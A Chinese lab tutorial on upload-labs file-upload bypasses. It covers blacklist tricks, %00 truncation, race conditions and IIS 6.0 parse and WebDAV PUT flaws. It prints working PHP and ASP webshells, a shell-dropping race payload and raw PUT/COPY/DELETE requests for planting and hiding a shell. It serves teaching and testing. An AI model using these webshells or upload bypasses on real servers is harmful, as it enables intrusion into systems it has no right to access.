array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA #这里并没有使用$file_ext&#x3D;trim($file_ext);来进行收尾去空的操作，可以使用空格绕过 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; BurpSuite绕过黑名单验证利用BurpSuite工具截断HTTP请求，对上传的文件名后加空格 上传一个带有一句话木马的文件，使用BurpSuite抓包，加上空格 forward进行放行，返回空白图，复制图片连接，打开新的页面将其复制运行 运行完成后复制地址，打开，成功返回 WebShell生成与上传-g 表示生成 -o 输出到webshell.php 可以使用webacoo生成webshell：webacoo -g -o webshell.php BurpSuite截断HTTP请求 ，修改对应的文件名，添加空格 -t 表示使用终端，链接之后反弹回来的可以执行cmd的终端 -u 表示URL 使用Webacoo连个上传成功地webshell：webacoo -t -u “URL” 使用webacoo生成一个webshell 页面上传并拦截，在文件或加空格绕过 复制图片连接打开新的页面，将地址复制，查看。页面返回空白 win+r打开cmd，查看当前ip，然后将图片地址复制，将其中的127.0.0.1改为本地ip，并在kali中使用webacoo连接，返回乱码说明正确 可以使用cmd命令 netstat -an命令式查看所有和本地计算机建立连接的IP 绕过黑名单验证(.号绕过)upload-labs第七关 .号绕过原理Windows系统下，文件后缀名最后一个点会被自动去除 例如：在桌面新建一个1.php. 系统会自动删除最后一个点 基于黑名单验证代码分析123456789101112131415161718192021222324if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); &#x2F;&#x2F; 加入去空格处理，不能使用空格绕过 &#x2F;&#x2F; 但是没有删除deldot这个.号，这样就可以利用Windows特性进行.号绕过 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); &#x2F;&#x2F; 进行了大小写转换，也不能进行大小写绕过 $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; BurpSuite绕过黑名单验证上传php文件，使用burp抓包，在文件后加上.号，放行 返回空白文档，复制图片地址，在新页面打开 生成并上传webshell1、生成：weevely generate 密码 路径 文件名使用weevely生成webshell 2、上传上传使用burp抓包加.放行 复制图片地址，在新的页面运行 3、连接：weevely shell文件地址 密码 可以使用help查看一下帮助信息 查看其中的一个net_scan端口扫描 使用system_info 绕过黑名单验证(特殊符号)upload-labs第八关 1、特殊符号绕过原理Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析 例如：在windows系统下新建一个文件名为1.php::$DATA的文件，查看效果。但是在Window下新建的文件名中，包含特殊符号不能成功新建 因为在Windows下不能建带有特殊符号的文本，所以在kali中新建 2、基于黑名单验证代码分析12345678910111213141516171819202122232425if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); &#x2F;&#x2F; 去空格，去末尾的点，转换大小写，首尾去空 &#x2F;&#x2F; 并没有黑名单过滤::这个符号和$DATA这个变量(::$DATA) &#x2F;&#x2F; $DATA这个变量是ADS NTFS系统，所具有的一种格式，数据流 $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 如果在Windows下使用1.php::$DATA系统会直接修改为,1.php，去掉::$DATA，因为Windows不支持文件有特殊符号，通过这种方式就可以绕过黑名单检测，以后在检测黑名单时一定要将这个内容去除掉，否则黑名单很容易被绕过。。。当然过滤时不推荐使用黑名单，推荐白名单，毕竟黑名单出现的漏洞太多。 3、直接上传1.php::$DATA上传带有特殊符号的php文件 页面返回空白图片 复制当前图片连接，使用菜刀或者蚁剑连接php脚本，将::$DATA特殊符号删除，进行连接，aaa是当时webshell中设置的密码 成功连接 绕过黑名单验证(路径拼接绕过)1、路径拼接绕过原理在没有对上传的文件进行重命名的请胯下，用户可以自定义文件名并在服务器上传新建，就会造成对应的绕过黑名单 例如： 用户新建 1.php.+空格+. deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.。 利用windows特性自动去除最后一个点，导致上传成功 所谓路径拼接，就是文件名直接拼接到上传的路径当中 2、基于黑名单验证码代码分析1234567891011121314151617181920212223if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点 $file_ext &#x3D; strrchr($file_name, &#39;.&#39;); $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写 $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123; &#x2F;&#x2F; 我们上传的文件没有进行随机化重命名，而是直接将对应文件名拼接到最终的路径下进行上传 $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; &#39;此文件不允许上传&#39;; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 3、修改文件名 绕过黑名单验证因为Windows特性不能再Windows下修改文件名为 12例如：file.php. . 需要在kali中修改 上传拼接文件，返回空白图片 选择图片的图片地址，在新的页面打开，因为我上传的php代码里面是phpinfo所以会返回phpinfo的内容 在查看upload下是否有file.php文件 这样的一个绕过，只适用于Windows系统，并且当前的文件名没有被重命名，而是直接使用用户上传的文件名，这时候用户文件名是一个可控状态 4、上传小WebShell(小马)，大WebShell(大马)上传WebShell，可以绕过上传过程中对文件大小等限制，从而能够更加有效上传大WebShell 在某些情况下，会对文件上传的大小做一些限制，为了突破这个限制，先上传小WebShell(小马)，也就是它本身就是一个可以上传WebShell的上传界面，而它的上传界面当中对应的代码对比相对的大WebShell(大马)，小很多。 通过缩减对应的字节数，从而达到符合对应的上传的限制，然后进行上传小WebShell，上传之后小WebShell是没有做限制的，这个时候就可以利用小WebShell上传更大的WebShell，从而突破文件上传工程中对文件大小的限制，以及其他限制 这是小马，代码量比较少 进行上传，返回空白图片，右键复制网页地址，在新的页面打开 打开网页地址，成功上传了小马 在进行上传大马，打开大马，复制其中内容Ctrl+A进行全部选取，Ctrl+C复制 复制到小马的上传文本框中，将之前的xiaoma.php改名为dama.php(起什么名字无所谓，只要不适合xiaomaphp相同就行)，点击create 注意：因为如果不改名的话就会将大马的内容上传到之前小马的php文件中 返回ok表示上传成功，这样就说明大马成功上传了 查看站点根目录，这样就有了dama.php 访问大马出现报错 因为之前小马中使用了utf-8的原因，我们将小马的编码删除，在按照以上的方式来上传一遍 绕过黑名单验证(双写绕过)upload-labs第十关 1、双写绕过原理代码编写过程中，支队黑名单中的内容进行空替换，因为只替换一次所造成的双写绕过 例如： 121.ph php p进行对应的空替换时，会首先发现php，将其过滤，过滤之后因为中间的php没有了，后面的p补上来，又变成了一个php文件，从而达到绕过。 2、基于黑名单验证代码分析str_ireplace()函数替换字符串中的一些字符(不区分大小写)。 该函数必须遵循下列规则 如果搜索的字符串是一个数组，那它将返回一个数组 如果搜索的字符串是一个数组，那么它将对数组中的每一个元素进行查找和替换 如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查询到的元素数量，那么多余的元素将用空字符进行替换 如果是对一个数组进行查找，但只是对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。 注释：该函数不区分大小写。请使用str_replace()函数来执行区分大小写的搜索。 注释：该函数是二进制安全的 12345678910111213141516if (isset($_POST[&#39;submit&#39;])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); &#x2F;&#x2F; 这里使用str_ireplace()函数，这个函数的意思是，只替换一次，并且为空。 &#x2F;&#x2F; 将$file_name中符合$deny_ext黑名单中的后缀名替换为空 $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name); if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123; $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name; $is_upload &#x3D; true; &#125; &#125; else &#123; $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;; &#125;&#125; 3、绕过黑名单验证将文件进行双写,例如：one.pphphp 选择文件进行上传，发现返回空白图片，复制图片地址 将复制的图像地址在菜刀或者蚁剑打开，成功上传 绕过白名单验证(00截断绕过)1、00截断原理0x00是十六进制表示方法，是ascii码为0的字符，在有些和函数处理时，会把这个字符当做结束符 系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束 在PHP5.3之后的版本中完全修复了00截断。并且00截断受限于GPC，addslashes函数 白名单验证就是指定的文件后缀名，比如只允许jpg、png等文件上传，进行文件上传时，只有后缀名符合这两个后缀名才允许上传，这就是白名单 %00字符截断的问题不只是在文件上传漏洞中有所利用，因为这是一个被广泛应用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都有可能出现问题，需要引起重视。而白名单在进行验证时可以直接在后面输入00 比如： 123再上传过程中它是一个jpg文件，但是在.php后面有0x00截断，.jpg忽略，这样就成功上传了1.php1.php0x00.jpg00后面的内容都将被忽略，但是在整个过程中，他的文件名还是依然存在 2、GET型00截断GET型提交的内容会被自动进行URL解码。 注意：进行00截断一定要关闭GPC，否则无法成功。 1234567891011121314151617181920if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; &#x2F;&#x2F; date()随机数和rand()时间，以及最后添加文件扩展名$file_ext &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功 $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; &#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名 if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &#39;上传失败！&#39;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 首先新建一个1.php的文件，将其里面写入一句话木马 写入一句话木马后，在将文件改名为1.jpg或者png只要是允许上传的文件格式就可以 进行上传，使用burp抓包，然后将burp中的信息进行稍微修改 修改完成后运行包通过，页面会返回空白图片，右击点击图片地址。 在新的页面将地址粘贴，粘贴完不能直接执行，需要将红线处的内容删除，也就是1.php后的内容删除，否则报错 删除之后在进入页面，返回phpinof的页面 这就是GTE截断。 3、POST型00截断除了常见的检查文件名后缀的方法外，有的应用，还会通过判断上传文件的文件头来验证文件的类型。比如以下代码 在POST请求中，%00不会被自动解码，需要在16进制中进行修改00 1234567891011121314151617181920if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; &#x2F;&#x2F; 这样就可以在date(&quot;YmdHis&quot;)后面加入0x00截断，使$file_ext被添加的文件后缀名不会被执行成功 $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; &#x2F;&#x2F; 使用move_uploaded_file将临时上传的文件$temp_file保存到$img_path路径下，并且进行了随机化重命名 if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else&#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 创建一个php文件，写入一句话木马，然后更改为可上传格式，进行上传burp抓包 这里加入空格的原因是因为%00不会被自动解码，需要在16进制中修改，因为加入空格已知他是16进制的20，所以在HEX只需要找到位置将20修改为00就可以截断 为了绕过类似的MIME Sniff的功能，常见的攻击技巧是伪造一个合法的文件头，而将真实的PHP等脚本代码附在合法的文件头之后 在HEX子模块中找到1.php空格，找到20 找到20之后，要将他修改为00 修改执行点击forward进行上传，返回一个空白图片，右键复制图片连接 在新的浏览器打开，当然还是需要将php格式后面的删除，成功访问 注意：截断需要关闭GPC否则会上传失败 4、一句话代码执行Webshell使用php中的函数system执行GET提交的参数 12345678910&lt;?php &#x2F;&#x2F; 当参数不为空时，执行if下的语句 &#x2F;&#x2F; 当if判断输入为空时，执行else语句 if($_GET)&#123; $cmd&#x3D;$_GET[&quot;cmd&quot;]; system($cmd); &#125;else&#123; echo &quot;no cmd&quot;; &#125;?&gt; 因为我们并没有提交任何参数，所以返回为no cmd为空 如果写入cmd=ipconfig，会返回ipconfig的详细信息 如果上感觉太乱，可以查看源码，这样就会整齐的列下来 在某些时候JS会限制右键，可以使用 “view-source:URL” 来查看源代码 例如： 1view-source:http:&#x2F;&#x2F;127.0.0.1&#x2F;upload-labs&#x2F;upload&#x2F;web.php?cmd&#x3D;ipconfig 图片WebShell上传1、图片WebShell制作在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范。可以检查文件二进制格式的前几个字节，从而判断文件类型是否正确。 新建php文件将其写入代码 将PHP格式改为jpg格式 2、上传图片WebShell文件将制作好的图片WebShell上传到服务器。 其中可能Content-Type验证。修改为image/gif或者image/jpg 符合当前文件类型的MIME 进行上传然后使用Burp抓包，Forward进行放行 返回空白图片，复制图片地址，在新的页面打开 发现页面打开，但是并没有phpinfo的界面，说明出错了 因为文件我们直接编写的，他没有直接显示，这样的话他还是没有直接显示对应的phpinfo，对于这种情况就要使用对用的文件包含漏洞进行对应的测试，才能执行对应的phpinfo 3、文件包含漏洞代码分析在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当做PHP代码执行，无论文件的名称是什么，只要符号文件内容符合PHP代码规范，都会被当作PHP代码执行 12345678&lt;?php if($_GET)&#123; include($_GET[&quot;file&quot;]); &#125; else&#123; echo &quot;not get args file&quot;; &#125;?&gt; 4、结合文件包含输出phpinfo将上面代码放在upload下，将地址复制打开，返回not get args file，说明代码没问题 在php后面加上?file=一句话木马的图片名称，将红线处的图片名称复制到蓝线处 利用存在文件包含的PHP页面，包含上传的图片WebShell，从而触发WebShell，输出对应的phpinfo 竞争条件upload-labs 17 1、文件上传过程介绍文件上传过程： 从浏览器上传到服务器，服务器接收到浏览器上传的文件时，服务器就会获取对应的文件，获取文件之后他不会立即将文件保存到对应的网站目录下，而是会将他保存到系统的临时文件当中，保存到临时文件之后，当我们在对应的脚本当中使用对应的重命名函数时，才会将临时文件移动到我们对应的上传目录下 例如：我们在php脚本语言当中使用move_uploade这个函数之后，才会将文件真实的上传到咱们对应的站点目录下。 2、竞争条件原理介绍网站逻辑： 1、网站允许上传任意文件，然后检查上传文件是否包含WebShell，如果包含删除该文件 2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件 问题： 在删除之前如果访问到上传的php文件或者其他脚本文件，从而执行上传中的php代码或者其他脚本代码 例如：上传文件代码 123456&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#39;);?&gt;假如以上代码命名为WebShell.php，那么再删除WebShell.php时，首先访问了WebShell.php，这时候就会在相应的WebShell.php当前目录下新建一个shell.php一句话脚本，从而可以使用菜刀进行连接通俗点说就是当你上传完WebShell.php文件，网站要检查你这个文件是不是包含了恶意脚本，检查的时候需要打开WebShell.php文件，当打开的时候就执行了php脚本，因为检查和删除是需要时间的，所以就在这个时间段内生成了一个shell.php脚本，将&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;这段代码放进了 shell.php中，这样就可以使用菜刀连接了 3、竞争条件代码分析先进行上传，然后进行判断与删除，利用时间差进行WebShell上传。 首先进行了对应的上传，上传之后才进行判断，判断上传的文件是否符合对应的条件，符合类型为jpg，png，gif，如果符合使用rename()函数进行重命名，如果不符合使用unlink()函数进行删除，这个时候就可以利用判断和删除的时间差来进行对应的webshell上传，从而访问到上传的php脚本 因为在move_uoloaded_file(){函数后面那里并没有进行判断，这个时候就可因进行上传比如一个1.php，网站在删除之前访问到1.php，那么1.php脚本当中内容就会执行 4、竞争条件文件上传利用提前不断访问代码文件，然后上传，最终使用才到连接一句话webshell Python发送http请求： 123import requestswhile true: requests.get(&quot;路径&quot;) 使用单一测试速度达不到，无法在删除之前进行对应的访问，为了达成实验目的，在删除之前加一个sleep进行延迟，时间延迟5秒 先查看upload，发现upload下没有任何文件 先执行text.py，使用python脚本进行不断地发送http请求，连接webshell.php 在kali中进行对应的上传 wireshark下查看可以看到不断地请求webshell.php 查看webshell.php中的代码，写入的shell.php和一句话木马 页面选择webshell.php进行提交 可以查看upload文件下，发现shell.php成功上传 打开shell.php查看内容，这是一句话木马 上传一句话木马后可以使用菜刀进行连接 中间件解析漏洞 - IIS6.0IIS文件解析问题IIS 6在处理文件解析时，也出过一些漏洞。前面提到的0X00字符截断文件名，在IIS和Windows环境下出过类似的漏洞，不过截断字符变成了” ; “ 当文件名为123.asp;111.jpg时，IIS 6会将文件解析为abc.asp，文件名被阶段了，从而导致脚本被执行。比如： 1http:&#x2F;&#x2F;192.168.127.25&#x2F;123.asp;111.jpg 会执行123.asp，而不会管111.jpg 1、IIS6.0解析漏洞介绍解析漏洞描述： 解析漏洞就是上传到web服务器上的这个文件并不是.asp命名的这样一个文件，会被服务器IIS6.0这个服务器解析为asp文件，这时候就造成了非.asp后缀名的文件，被当做asp脚本执行，从而执行其中的代码 注意：这两个IIS漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的1）当监理*.asp格式的文件夹时，其目录下的任意文件讲被IIS当作asp文件解析。 1&lt;%&#x3D;anoe()%&gt; 在Windows sever2000当中进行测试，新建了一个站点 打开浏览器进行访问，可以正常打开 在站点的根目录新建一个文件夹1.asp 下面进行访问，访问1.asp下的1.txt文本，发现并没有输入NOW而是将文本变成了asp执行 2）当文件*.asp;1.jpg IIS6.0同样会将文件作为asp文件解析 在根目录下新建一个a.asp;1.txt 在文本中写入 &lt;%NOW()%&gt; asp内容 进行访问这个网址a.asp;1.txt，页面也没有返回NOW而是返回了当前时间 2、IIS6.0 PUT上传原理WebDAV基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE等功能，它所包含的PUT方法，允许用户上传文件到指定路径下。 在许多Web Sever 中，默认都禁用了此方法，或者对能够上传的文件类型做了严格限制。但在IIS中，如果目录支持写权限，同时开启了WebDav，则会支持PUT方法，再结合MOVE方法，就能够将原本只允许上传文本文件改写为脚本文件，从而执行WebShell。MOVE能否执行成功取决于IIS服务器是否勾选了”脚本资源访问”复选框 如果要实施这个攻击过程，攻击者应先通过OPTIONS方法探测服务器支持的HTTP方法类型，如果支持PUT，则使用PUT上传一个指定的文本文件，最后再通过MOVE改写脚本文件 ​ 1、探测是否存在IIS PUT 漏洞： 1234&#x2F;&#x2F; 如果探测过程中出现了对应支持的这些方法，那就说明存在IIS PUT漏洞&#x2F;&#x2F; 当然也有很多中间件支持PUTOPTIONS&#x2F;HTTP1.1Host:www.xxx.com ​ 2、上传txt文本文件 123456&#x2F;&#x2F; 如果上面探测出PUT方法，就可以使用PUT然后设置对应的上传位置，将他传到根目录下的a.txtPUT &#x2F;a.txt HTTP1.1Host：www.xxx.comContent-Length：30 &lt;%eval reques(&quot;chopper&quot;)%&gt; ​ 3、通过Move或Copy重名 12345&#x2F;&#x2F; 上传之后是上传了一个txt文本文档，这时候就需要copy将其拷贝到其他位置&#x2F;&#x2F; 比如将a.txt拷贝到cmd.asp,这时候txt文件就会被重命名为cmd.aspCOPY&#x2F;a.txt HTTP1.1 HOST：www.xxx.comDestination：http:&#x2F;&#x2F;www.xxx.com&#x2F;cmd.asp ​ 4、删除 123&#x2F;&#x2F; 为了防止多余的txt文档被系统管理员看到，这个时候就是用delete来删除根目录下的a.txtDELETE&#x2F;a.txt HTTP1.1Host:www.xxx.com 3、IIS6.0 PUT上传探测可以使用OPTIONS探测，也可以使用自动化工具探测 自动化工具探测 使用nikto探测 1-nikto -h IP地址 例如： 因为支持这几个方法所以可以确定存在IIS漏洞 4、IIS6.0 PUT上传利用以下内容中的asp写错了多加了一个括号和@符号正确格式 1&lt;% eval request(&quot;cmd&quot;)%&gt; 利用burpsuite进行IIS PUT漏洞利用。先OPTIONS探测、PUT、MOVE、DELETE 